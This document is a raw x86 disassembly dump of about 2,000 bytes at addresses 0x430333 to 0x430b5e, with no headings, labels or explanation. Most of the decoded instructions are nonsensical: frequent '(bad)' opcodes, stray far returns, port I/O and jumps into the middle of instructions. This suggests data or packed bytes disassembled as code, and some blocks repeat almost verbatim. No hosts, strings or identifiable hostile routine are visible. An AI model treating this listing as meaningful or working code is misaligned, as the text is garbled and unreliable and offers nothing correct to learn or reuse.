  430333:	mov    DWORD PTR ds:0x8000c7a0,edi
  430339:	mov    ebp,esp
  43033b:	cld    
  43033c:	loop   0x4302cb
  43033e:	inc    ebp
  43033f:	(bad)  
  430340:	out    dx,al
  430341:	(bad)  
  430342:	fisttp WORD PTR [eax+0x8801c7]
  430348:	jecxz  0x43038f
  43034a:	in     al,dx
  43034b:	inc    DWORD PTR [ebp-0x4]
  43034e:	out    0x8d,eax
  430350:	aas    
  430351:	inc    edi
  430353:	jmp    FWORD PTR [eax-0x78]
  430356:	inc    DWORD PTR [ecx]
  430358:	mov    DWORD PTR [eax],0xc7043d
  43035e:	ins    BYTE PTR es:[edi],dx
  43035f:	test   edi,edi
  430361:	pandn  mm0,mm5
  430364:	aas    
  430365:	add    bh,al
  430367:	mov    esi,DWORD PTR [eax-0x4]
  43036a:	inc    DWORD PTR [eax+0xdf01ee]
  430370:	(bad)  
  430371:	or     BYTE PTR [ebp+eax*2-0x1],dh
  430375:	mov    ebp,ebx
  430377:	xchg   esp,eax
  430378:	fild   DWORD PTR [eax]
  43037a:	(bad)  
  43037b:	mov    edi,DWORD PTR [eax+0x3]
  43037e:	(bad)  
  43037f:	cmp    al,0xe7
  430381:	dec    ebp
  430382:	leave  
  430383:	mov    ebp,eax
  430385:	fsubr  DWORD PTR [edx]
  430387:	add    BYTE PTR [eax],al
  430389:	lea    ecx,[ebx-0x7f0003b4]
  43038f:	push   edx
  430390:	add    DWORD PTR [ebp+0x0],edx
  430393:	mov    esi,DWORD PTR [eax]
  430395:	mov    WORD PTR [edi],ss
  430397:	add    BYTE PTR [eax],al
  430399:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43039f:	add    ah,bh
  4303a1:	push   0x7d
  4303a3:	dec    DWORD PTR [ebx+0xd88c]
  4303a9:	push   edx
  4303aa:	mov    edx,DWORD PTR [ecx-0x4]
  4303ad:	call   DWORD PTR [eax+0x7d01fc]
  4303b3:	mov    esi,DWORD PTR [esi]
  4303b5:	cld    
  4303b6:	add    BYTE PTR [eax+0x560150],dl
  4303bc:	test   DWORD PTR [ebp+0x75],eax
  4303bf:	loop   0x43034c
  4303c1:	jmp    0xe38b:0x947dc7fc
  4303c8:	fsub   st,st(7)
  4303ca:	add    bh,al
  4303cc:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  4303d2:	add    edi,edi
  4303d4:	add    bh,bh
  4303d6:	adc    al,0xed
  4303d8:	add    dh,ah
  4303da:	push   eax
  4303db:	inc    ebp
  4303dc:	push   esi
  4303dd:	fisttp WORD PTR [ebx+0x4dc7f43f]
  4303e3:	test   BYTE PTR [ebx],dh
  4303e5:	out    0x5,al
  4303e7:	shl    BYTE PTR [edx+0x45],0x0
  4303eb:	jmp    0x4303ae
  4303ed:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  4303f4:	inc    esi
  4303f5:	jle    0x4303f7
  4303f7:	test   edi,eax
  4303f9:	(bad)  
  4303fa:	call   0x13004fe
  4303ff:	out    0x75,al
  430401:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430407:	in     al,dx
  430408:	mov    esp,edx
  43040a:	mov    ah,0x85
  43040c:	add    bh,bh
  43040e:	call   0x1292e12
  430413:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43041a:	add    ebx,esp
  43041c:	add    ah,ch
  43041e:	xor    BYTE PTR [ebp-0xff0073],al
  430424:	mov    ebx,ebp
  430426:	cld    
  430427:	jle    0x4303b2
  430429:	add    DWORD PTR gs:[eax],eax
  43042c:	add    BYTE PTR [eax+0x1],dl
  43042f:	inc    ebp
  430430:	inc    ebp
  430431:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  430437:	dec    DWORD PTR [ebx-0x3fd80318]
  43043d:	add    BYTE PTR [ebp-0xbf0040],dl
  430443:	inc    ebp
  430444:	fmul   QWORD PTR [ebx-0x4faf0400]
  43044a:	inc    ebp
  43044b:	add    DWORD PTR [ebx+0x459c00],ecx
  430451:	mov    edi,edi
  430453:	mov    eax,0xe80800ff
  430458:	inc    ebp
  430459:	sub    cl,BYTE PTR [ebx-0x47000400]
  43045f:	add    al,0x1
  430461:	rol    BYTE PTR [eax],0x1e
  430464:	jne    0x4304ab
  430466:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  43046c:	inc    DWORD PTR [ecx]
  43046e:	call   0x882d73
  430473:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  430479:	call   0x432e7f
  43047e:	xor    bh,bh
  430480:	push   edi
  430481:	adc    BYTE PTR [ebx-0x74741bbb],al
  430487:	fsub   st,st(4)
  430489:	ret    
  43048a:	loopne 0x430427
  43048c:	xor    DWORD PTR [edx],0x31
  43048f:	cmp    edi,edi
  430491:	bswap  eax
  430493:	rol    BYTE PTR gs:[eax],0x5
  430497:	jmp    0x12e05e1
  43049c:	mov    eax,DWORD PTR [ebp-0x4]
  43049f:	add    BYTE PTR [eax+0xff0100],bh
  4304a5:	cld    
  4304a6:	jne    0x430525
  4304a8:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4304ae:	jb     0x4304b1
  4304b0:	add    BYTE PTR [eax],al
  4304b2:	push   eax
  4304b3:	fild   DWORD PTR [ebp+0x0]
  4304b6:	mov    edx,DWORD PTR [eax-0x68]
  4304b9:	inc    ebp
  4304ba:	add    BYTE PTR [ebx+0xffa8ff],cl
  4304c0:	or     bh,bh
  4304c2:	inc    ebp
  4304c3:	call   0x1272bc7
  4304c8:	jge    0x430517
  4304ca:	adc    BYTE PTR [ebx+0x459cb9],cl
  4304d0:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  4304d6:	fwait
  4304d7:	mov    eax,0x30132
  4304dc:	lea    esi,[ebp+0x2c]
  4304df:	xor    edi,edi
  4304e1:	(bad)  
  4304e2:	call   0x1422e4f
  4304e7:	call   0x1372e77
  4304ec:	jne    0x430479
  4304ee:	xor    edi,esp
  4304f0:	add    eax,DWORD PTR [eax+0xc018d]
  4304f6:	push   DWORD PTR [eax]
  4304f8:	call   0xcc2e54
  4304fd:	enter  0x45ff,0xe0
  430501:	mov    ecx,DWORD PTR [ebp-0x28]
  430504:	xor    eax,DWORD PTR [eax]
  430506:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43050c:	(bad)  
  43050d:	xchg   ebp,eax
  43050e:	call   0x1420612
  430513:	mov    cl,0x45
  430515:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43051b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  430522:	mov    edi,edi
  430524:	or     BYTE PTR [eax],cl
  430526:	inc    ebp
  430527:	test   DWORD PTR gs:[eax],eax
  43052a:	je     0x430571
  43052c:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  430532:	xor    edx,DWORD PTR [eax-0x73]
  430535:	push   ebp
  430536:	or     BYTE PTR [ebp+0x21007572],al
  43053c:	inc    ebp
  43053d:	loopne 0x4304ca
  43053f:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  430546:	int    0x0
  430548:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  43054e:	inc    ebp
  43054f:	push   ebp
  430550:	cmp    ebp,eax
  430552:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  430559:	cld    
  43055a:	fadd   QWORD PTR [eax+0x3b014d]
  430560:	jne    0x430592
  430562:	push   0xf8898557
  430567:	loopne 0x4305de
  430569:	inc    ebp
  43056a:	lea    eax,[ebx+0x72e8e4cc]
  430570:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  430576:	jmp    0x4305ab
  430578:	mov    edi,DWORD PTR [edi+0x4572bc]
  43057e:	xor    eax,edi
  430580:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43058a:	rcl    BYTE PTR [eax-0x40],1
  43058d:	inc    ebp
  43058e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430596:	inc    ebp
  430597:	xchg   ebp,eax
  430598:	ud0    ebp,DWORD PTR [ebx]
  43059b:	inc    DWORD PTR [eax]
  43059d:	daa    
  43059e:	jbe    0x4305a0
  4305a0:	mov    dl,BYTE PTR [eax-0x80]
  4305a3:	push   ebp
  4305a4:	pop    ds
  4305a5:	mov    ecx,DWORD PTR [esp+esi*8]
  4305a8:	inc    eax
  4305a9:	retf   
  4305aa:	inc    ebp
  4305ab:	iret   
  4305ac:	jb     0x430576
  4305ae:	mov    eax,DWORD PTR [edi]
  4305b0:	int3   
  4305b1:	inc    ebp
  4305b2:	inc    ebp
  4305b3:	add    DWORD PTR [ecx],esi
  4305b5:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  4305bc:	xor    dh,BYTE PTR [ebx]
  4305be:	pushf  
  4305bf:	lea    ecx,[ecx+0x4d72d808]
  4305c5:	add    BYTE PTR [ebx],dh
  4305c7:	inc    ebp
  4305c8:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  4305ce:	xor    dl,BYTE PTR [edx]
  4305d0:	add    eax,DWORD PTR [ebp-0x77]
  4305d3:	mov    eax,esp
  4305d5:	fmul   QWORD PTR [ebp-0x3d]
  4305d8:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  4305df:	mov    DWORD PTR [ebp-0x24],eax
  4305e2:	rol    DWORD PTR [ebp-0x64],1
  4305e5:	xor    eax,edi
  4305e7:	mov    ecx,0xff858db0
  4305ec:	clc    
  4305ed:	enter  0x4d45,0x3c
  4305f1:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  4305f8:	test   esi,edi
  4305fa:	clc    
  4305fb:	inc    DWORD PTR [ebp+0x45]
  4305fe:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430606:	test   DWORD PTR [ecx],esi
  430608:	clc    
  430609:	pushf  
  43060a:	inc    ebp
  43060b:	(bad)  
  43060c:	cmp    ah,bh
  43060e:	pushf  
  43060f:	inc    ebp
  430610:	mov    edx,DWORD PTR [eax-0x24]
  430613:	add    BYTE PTR [ebp+0x0],dl
  430616:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43061c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  430620:	add    al,dl
  430622:	jmp    0x10407f2
  430627:	jb     0x430676
  430629:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  43062f:	xor    ecx,DWORD PTR [ebp+0x3b]
  430632:	xor    ecx,DWORD PTR [edi]
  430634:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  430638:	(bad)  
  43063a:	clc    
  43063b:	int3   
  43063c:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  430643:	push   cs
  430644:	xor    ecx,eax
  430646:	xor    esp,ecx
  430648:	add    ebp,DWORD PTR [eax]
  43064a:	add    esi,DWORD PTR [eax]
  43064c:	(bad)  
  43064e:	retf   0x55cc
  430651:	repnz mov eax,DWORD PTR [ebp-0x10]
  430655:	(bad)  
  430656:	cli    
  430657:	fdiv   st(1),st
  430659:	test   DWORD PTR [eax+edi*8],ecx
  43065c:	dec    ebp
  43065d:	inc    ebp
  43065e:	xor    edi,DWORD PTR [eax-0x7167afd]
  430664:	add    BYTE PTR [ebp+0x0],al
  430667:	mov    ecx,DWORD PTR [ebp-0x24]
  43066a:	mov    ecx,ebx
  43066c:	clc    
  43066d:	jne    0x43063a
  43066f:	mov    esi,0xd672d3
  430674:	into   
  430675:	into   
  430676:	scas   eax,DWORD PTR es:[edi]
  430677:	dec    ebp
  430678:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  43067e:	sub    ecx,esi
  430680:	cmp    ecx,DWORD PTR [ebp+0x77]
  430683:	(bad)  
  430684:	mov    edi,eax
  430686:	mov    al,0x85
  430688:	mov    eax,edi
  43068a:	add    BYTE PTR [ebp-0x75],al
  43068d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430694:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43069a:	(bad)  
  43069c:	retf   0x559c
  43069f:	(bad)  
  4306a0:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4306a7:	inc    ebp
  4306a8:	add    eax,0xeb9c4d3f
  4306ad:	(bad)  
  4306ae:	mov    ecx,eax
  4306b0:	lods   al,BYTE PTR ds:[esi]
  4306b1:	test   DWORD PTR [ebp-0x8],edx
  4306b4:	xor    ecx,DWORD PTR [ebp+0x33]
  4306b7:	mov    eax,DWORD PTR [ebx]
  4306b9:	lock add ecx,ebx
  4306bc:	bswap  esi
  4306be:	retf   0x55d1
  4306c1:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  4306c7:	jmp    0x4306c2
  4306c9:	add    BYTE PTR ds:0xebc44d8b,al
  4306cf:	push   ebp
  4306d0:	mov    ebp,DWORD PTR [ebx]
  4306d2:	test   al,0x8b
  4306d4:	push   ebp
  4306d5:	clc    
  4306d6:	xor    ecx,ebx
  4306d8:	xor    ecx,esi
  4306da:	add    edx,ecx
  4306dc:	add    eax,DWORD PTR [edx+0xca010f]
  4306e2:	push   ebp
  4306e3:	dec    ebp
  4306e4:	mov    ecx,DWORD PTR [ebx-0x34050710]
  4306ea:	stc    
  4306eb:	rol    DWORD PTR ds:0xebce4dd6,cl
  4306f1:	scas   eax,DWORD PTR es:[edi]
  4306f2:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  4306f8:	xor    ebp,DWORD PTR [ebx]
  4306fa:	xor    edi,DWORD PTR [ebx]
  4306fc:	add    esi,DWORD PTR [edi+0x3]
  4306ff:	mov    ecx,DWORD PTR [edi]
  430701:	clc    
  430702:	retf   0x55cb
  430705:	into   
  430706:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43070d:	mov    eax,0x3376554d
  430712:	mov    esi,DWORD PTR [ebx]
  430714:	enter  0x5503,0x3
  430718:	xor    ecx,DWORD PTR [edi]
  43071a:	xor    ecx,edx
  43071c:	add    edx,DWORD PTR [ebp+0x3]
  43071f:	mov    ecx,DWORD PTR [edi]
  430721:	lock retf 0x4dfa
  430725:	stc    
  430726:	mov    ecx,DWORD PTR [eax]
  430728:	or     BYTE PTR [ebp+0x4d],cl
  43072b:	jmp    0x10707bb
  430730:	dec    ebp
  430731:	dec    ebp
  430732:	(bad)  
  430733:	mov    esp,esp
  430735:	clc    
  430736:	test   ebx,ecx
  430738:	clc    
  430739:	ror    DWORD PTR [ebp-0x2a],cl
  43073c:	mov    esi,ecx
  43073e:	in     al,dx
  43073f:	scas   eax,DWORD PTR es:[edi]
  430740:	inc    ebp
  430741:	mov    esi,DWORD PTR [ebx]
  430743:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  43074a:	retf   
  43074b:	ja     0x43071b
  43074d:	mov    ebp,DWORD PTR [eax-0x48]
  430750:	dec    ebp
  430751:	xor    ecx,DWORD PTR [di+0x3]
  430755:	mov    ebp,eax
  430757:	clc    
  430758:	push   ebp
  430759:	retf   
  43075a:	mov    dl,bl
  43075c:	adc    esi,edx
  43075e:	jb     0x43072e
  430760:	add    BYTE PTR [edi-0x3b7474b3],ch
  430766:	in     al,dx
  430767:	jge    0x430734
  430769:	sub    ecx,DWORD PTR [ebp+0x3b]
  43076c:	mov    esi,DWORD PTR [edi-0x24]
  43076f:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  430776:	mov    BYTE PTR [ebx-0x34b20729],cl
  43077c:	mov    edx,ebx
  43077e:	in     al,dx
  43077f:	(bad)  
  430780:	ror    esi,cl
  430782:	push   ebp
  430783:	scas   eax,DWORD PTR es:[edi]
  430784:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43078a:	fwait
  43078b:	sub    esi,DWORD PTR [edx]
  43078d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430793:	lods   al,BYTE PTR ds:[esi]
  430794:	xor    esp,DWORD PTR [ebx]
  430796:	add    ecx,DWORD PTR [ebp-0x18]
  430799:	mov    edi,DWORD PTR [ebp-0x8]
  43079c:	mov    bl,cl
  43079e:	cmp    dl,bl
  4307a0:	jb     0x430770
  4307a2:	add    dh,dl
  4307a4:	dec    ebp
  4307a5:	scas   eax,DWORD PTR es:[edi]
  4307a6:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  4307ac:	shr    DWORD PTR [ebx],cl
  4307ae:	into   
  4307af:	cmp    edx,esi
  4307b1:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  4307b7:	dec    ebp
  4307b8:	dec    ebp
  4307b9:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  4307bf:	retf   
  4307c0:	xor    edx,esi
  4307c2:	add    ecx,esi
  4307c4:	imul   ecx,edx
  4307c7:	mov    DWORD PTR [ebp+0x8],edx
  4307ca:	xor    ecx,DWORD PTR [ebp+0x2b]
  4307cd:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  4307d3:	add    esi,DWORD PTR [ebx]
  4307d5:	mov    ah,0x3
  4307d7:	inc    ebp
  4307d8:	rdtsc  
  4307da:	xlat   BYTE PTR ds:[ebx]
  4307db:	pushf  
  4307dc:	jge    0x430767
  4307de:	xor    ebx,esp
  4307e0:	sub    eax,DWORD PTR [ebp-0x73]
  4307e3:	(bad)  
  4307e4:	cmp    al,al
  4307e6:	jb     0x43076d
  4307e8:	add    al,bh
  4307ea:	ror    DWORD PTR [ebp-0x7a],1
  4307ed:	xor    edi,edi
  4307ef:	add    edi,edi
  4307f1:	jmp    0x430840
  4307f3:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  4307f9:	dec    ebp
  4307fa:	into   
  4307fb:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430801:	fwait
  430802:	shl    DWORD PTR [edx],cl
  430804:	retf   0x5588
  430807:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43080d:	add    eax,DWORD PTR [eax]
  43080f:	call   0x8ace5d61
  430814:	fcom   DWORD PTR [ecx]
  430816:	retf   
  430817:	jb     0x43087e
  430819:	add    ch,cl
  43081b:	dec    ebp
  43081c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  430822:	dec    ebp
  430823:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  430829:	jge    0x4307f9
  43082b:	mov    BYTE PTR [edi+0xf723b3a],ch
  430831:	add    cl,dh
  430833:	dec    ebp
  430834:	dec    DWORD PTR [ebx-0x2c031b75]
  43083a:	adc    BYTE PTR [ebp+0x1],0x8b
  43083e:	add    ah,bl
  430840:	jge    0x4307ce
  430842:	push   0xffffff9b
  430844:	push   0x8b3032
  430849:	shl    BYTE PTR [ebp+0x55],0x6a
  43084d:	xor    edi,edi
  43084f:	xor    edx,DWORD PTR [ebx+eax*1]
  430852:	inc    ebp
  430853:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  430859:	dec    ebp
  43085a:	or     BYTE PTR [ecx+0x4dcce883],cl
  430860:	jbe    0x4307ed
  430862:	mov    esp,eax
  430864:	ror    bl,1
  430866:	enter  0x14ce,0xaf
  43086a:	dec    DWORD PTR [ebx-0x2cef13f8]
  430870:	push   ebp
  430871:	retf   0x5540
  430874:	push   ebp
  430875:	mov    esi,DWORD PTR [edx-0x18]
  430878:	mov    edx,ebx
  43087a:	cld    
  43087b:	(bad)  
  43087c:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430883:	sti    
  430884:	add    dh,cl
  430886:	push   0xffffff94
  430888:	call   FWORD PTR [ebx+0x3b5032d0]
  43088e:	mov    ecx,DWORD PTR [edi]
  430890:	enter  0x455e,0xff
  430894:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43089a:	xor    esi,DWORD PTR [ebx]
  43089c:	mov    DWORD PTR [ebx],0xcace0f9c
  4308a2:	aas    
  4308a3:	push   ebp
  4308a4:	inc    ebp
  4308a5:	xor    edx,esi
  4308a7:	add    edx,esi
  4308a9:	mov    eax,DWORD PTR [ebx]
  4308ab:	(bad)  
  4308ac:	jmp    0x43083a
  4308ae:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  4308b4:	rol    ah,1
  4308b6:	mov    esi,0xf133104d
  4308bb:	mov    edx,0xff388d80
  4308c0:	mov    dh,0xd1
  4308c2:	cmp    edx,DWORD PTR [ebp+0xf]
  4308c5:	mov    eax,DWORD PTR [edx-0x28]
  4308c8:	add    BYTE PTR [ebp-0x75],bh
  4308cb:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  4308d2:	fwait
  4308d3:	retf   0x8632
  4308d6:	cmp    ebp,0x8
  4308d9:	call   ebx
  4308db:	inc    ebp
  4308dc:	inc    ebp
  4308dd:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  4308e3:	mov    esi,DWORD PTR [ecx]
  4308e5:	int3   
  4308e6:	pushf  
  4308e7:	add    al,0xc7
  4308e9:	add    al,al
  4308eb:	add    bl,al
  4308ed:	(bad)  
  4308ee:	clc    
  4308ef:	int3   
  4308f0:	inc    ebp
  4308f1:	add    BYTE PTR [ecx],dh
  4308f3:	push   eax
  4308f4:	pushf  
  4308f5:	mov    edi,eax
  4308f7:	enter  0xc008,0x85
  4308fb:	aas    
  4308fc:	clc    
  4308fd:	gs inc ebp
  4308ff:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430905:	push   ss
  430906:	xor    ecx,DWORD PTR [ebp+0x3]
  430909:	sub    edx,DWORD PTR [ecx-0x76]
  43090c:	dec    ebp
  43090d:	add    DWORD PTR [ebx+0x88d845],ecx
  430913:	mov    esi,DWORD PTR [ebx]
  430915:	or     BYTE PTR [ebx],al
  430917:	cmp    edx,DWORD PTR [ecx-0x34]
  43091a:	dec    ebp
  43091b:	out    dx,eax
  43091c:	xor    eax,DWORD PTR [ebp+0x3]
  43091f:	mov    edx,DWORD PTR [ecx-0x28]
  430922:	dec    ebp
  430923:	add    BYTE PTR [ebx],dh
  430925:	push   0x518003
  43092a:	push   eax
  43092b:	add    BYTE PTR [ebx-0x300748b],cl
  430931:	sbb    BYTE PTR [ebp+0x45],cl
  430934:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  43093a:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  430940:	dec    ebp
  430941:	inc    ebp
  430942:	xor    edx,esi
  430944:	add    edx,esi
  430946:	push   ecx
  430947:	(bad)  
  430948:	dec    ebp
  430949:	mov    al,ds:0xc5d83dff
  43094e:	retf   
  43094f:	(bad)  
  430950:	into   
  430951:	sub    bh,bh
  430953:	dec    esp
  430954:	adc    al,0x9c
  430956:	inc    ebp
  430957:	push   ebp
  430958:	test   DWORD PTR [edi],ecx
  43095a:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  430961:	jmp    0xc9bc1875
  430966:	add    cl,dl
  430968:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  430972:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  430978:	rol    BYTE PTR [eax],0x54
  43097b:	clc    
  43097c:	gs jb  0x430986
  43097f:	mov    eax,DWORD PTR [ebp-0x30]
  430982:	xor    al,0x40
  430984:	sub    al,0xc7
  430986:	mov    al,ah
  430988:	add    DWORD PTR [ebp+0x4534f845],eax
  43098e:	sub    al,0x80
  430990:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430997:	mov    ch,0xff
  430999:	clc    
  43099a:	add    DWORD PTR [ebp+0x60],0x3d
  43099e:	call   FWORD PTR [eax+eax*1-0x277a77]
  4309a5:	inc    ebp
  4309a6:	dec    DWORD PTR [ebx-0x3427f701]
  4309ac:	test   esi,ecx
  4309ae:	dec    DWORD PTR [ebx-0x7f8a3701]
  4309b4:	push   eax
  4309b5:	add    DWORD PTR [ebp+0x0],eax
  4309b8:	dec    ebx
  4309ba:	or     al,0xce
  4309bc:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  4309c3:	into   
  4309c4:	add    BYTE PTR [ebx-0x34ff2000],cl
  4309ca:	mov    esi,ecx
  4309cc:	sar    bh,0x45
  4309cf:	adc    al,0x8b
  4309d1:	clc    
  4309d2:	fadd   DWORD PTR [ebp+0x0]
  4309d5:	mov    ebp,DWORD PTR [edx+0x8]
  4309d8:	push   edi
  4309d9:	adc    BYTE PTR [eax+0x1],0x83
  4309dd:	add    al,al
  4309df:	retf   
  4309e0:	mov    ecx,esi
  4309e2:	cld    
  4309e3:	mov    eax,DWORD PTR [eax+0xcb01c8]
  4309e9:	into   
  4309ea:	add    BYTE PTR [ebx+0x756ae000],cl
  4309f0:	jne    0x430a25
  4309f2:	inc    DWORD PTR [ebx]
  4309f4:	rcl    BYTE PTR [ecx+0x50],1
  4309f7:	push   eax
  4309f8:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  4309fe:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430a05:	sar    bh,0x84
  430a08:	or     BYTE PTR [ebx],al
  430a0a:	push   eax
  430a0b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430a11:	pushf  
  430a12:	xor    edi,eax
  430a14:	pushf  
  430a15:	mov    ah,0x89
  430a17:	test   esp,ebp
  430a19:	clc    
  430a1a:	inc    ebp
  430a1b:	inc    ebp
  430a1c:	mov    DWORD PTR [eax+eax*8],esi
  430a1f:	sub    al,0x32
  430a21:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  430a28:	dec    ebp
  430a29:	xor    eax,DWORD PTR gs:[edi+0x3]
  430a2d:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  430a33:	xor    eax,DWORD PTR gs:[edi+0x3]
  430a37:	or     DWORD PTR [ecx+0x45ff085c],0x0
  430a3e:	shl    DWORD PTR [ebp-0x380064],1
  430a44:	enter  0x858d,0x60
  430a48:	clc    
  430a49:	inc    DWORD PTR [ebp+0x50]
  430a4c:	cmp    al,0x75
  430a4e:	pushf  
  430a4f:	(bad)  
  430a50:	(bad)  
  430a51:	pop    esp
  430a52:	lods   al,BYTE PTR ds:[esi]
  430a53:	inc    DWORD PTR [ebp+0x4508f8ff]
  430a59:	mov    edi,DWORD PTR [esi]
  430a5b:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  430a62:	test   DWORD PTR [edi-0x8],edx
  430a65:	sbb    al,0x45
  430a67:	add    BYTE PTR [eax],bh
  430a69:	push   0x8b809c
  430a6e:	loopne 0x430ab5
  430a70:	push   ebp
  430a71:	mov    esi,DWORD PTR [ebx]
  430a73:	cld    
  430a74:	add    eax,DWORD PTR [eax+0xf013b]
  430a7a:	adc    al,0x0
  430a7c:	add    bh,bh
  430a7e:	jmp    0xc00b9b
  430a83:	add    BYTE PTR [ebp+0x45],cl
  430a86:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  430a8c:	dec    ebp
  430a8d:	push   0x38033
  430a92:	cmp    eax,DWORD PTR [eax]
  430a94:	unpcklps xmm7,xmm0
  430a97:	jne    0x430a99
  430a99:	dec    DWORD PTR [ebx+0x5545c818]
  430a9f:	mov    DWORD PTR [ebx],esi
  430aa1:	shl    BYTE PTR [ebx],1
  430aa3:	inc    ebp
  430aa4:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  430aaa:	retf   0x5575
  430aad:	dec    DWORD PTR [ebx-0x5ba13e8]
  430ab3:	(bad)  
  430ab4:	stc    
  430ab5:	loopne 0x430ac3
  430ab7:	test   DWORD PTR [ebp-0x8],ecx
  430aba:	xor    eax,DWORD PTR [ebp+0x3]
  430abd:	mov    ebp,ecx
  430abf:	rol    BYTE PTR [eax],1
  430ac1:	inc    ebp
  430ac2:	add    BYTE PTR [eax-0x7747ab3],bh
  430ac8:	clc    
  430ac9:	inc    ebp
  430aca:	retf   
  430acb:	mov    edx,ebx
  430acd:	loopne 0x430aa5
  430acf:	retf   
  430ad0:	into   
  430ad1:	into   
  430ad2:	scas   eax,DWORD PTR es:[edi]
  430ad3:	dec    ebp
  430ad4:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  430ada:	sub    ecx,esi
  430adc:	cmp    ecx,DWORD PTR [ebp+0x77]
  430adf:	(bad)  
  430ae0:	mov    edi,eax
  430ae2:	enter  0x8985,0xf8
  430ae6:	add    BYTE PTR [ebp-0x75],al
  430ae9:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  430af0:	xor    eax,DWORD PTR [ebp+0x4503f803]
  430af6:	(bad)  
  430af8:	retf   0x559c
  430afb:	(bad)  
  430afc:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430b03:	inc    ebp
  430b04:	add    eax,0xeb9c4d3f
  430b09:	(bad)  
  430b0a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430b10:	xor    ecx,DWORD PTR [ebp+0x33]
  430b13:	mov    eax,DWORD PTR [ebx]
  430b15:	in     al,dx
  430b16:	add    ecx,ebx
  430b18:	bswap  esi
  430b1a:	retf   0x55d1
  430b1d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  430b23:	jmp    0x430b1e
  430b25:	add    BYTE PTR ds:0xebf44d8b,al
  430b2b:	push   ebp
  430b2c:	mov    ebp,DWORD PTR [ebx]
  430b2e:	mov    eax,0x33f8558b
  430b33:	retf   
  430b34:	xor    ecx,esi
  430b36:	add    edx,ecx
  430b38:	add    eax,DWORD PTR [edx+0xca010f]
  430b3e:	push   ebp
  430b3f:	dec    ebp
  430b40:	mov    ecx,DWORD PTR [ebx-0x34050714]
  430b46:	stc    
  430b47:	rol    DWORD PTR ds:0xebce4dd6,cl
  430b4d:	scas   eax,DWORD PTR es:[edi]
  430b4e:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  430b54:	xor    ebp,DWORD PTR [ebx]
  430b56:	xor    edi,DWORD PTR [ebx]
  430b58:	add    esi,DWORD PTR [edi+0x3]
  430b5b:	mov    ecx,DWORD PTR [edi]
  430b5d:	clc    
  430b5e:	retf   0x55cb
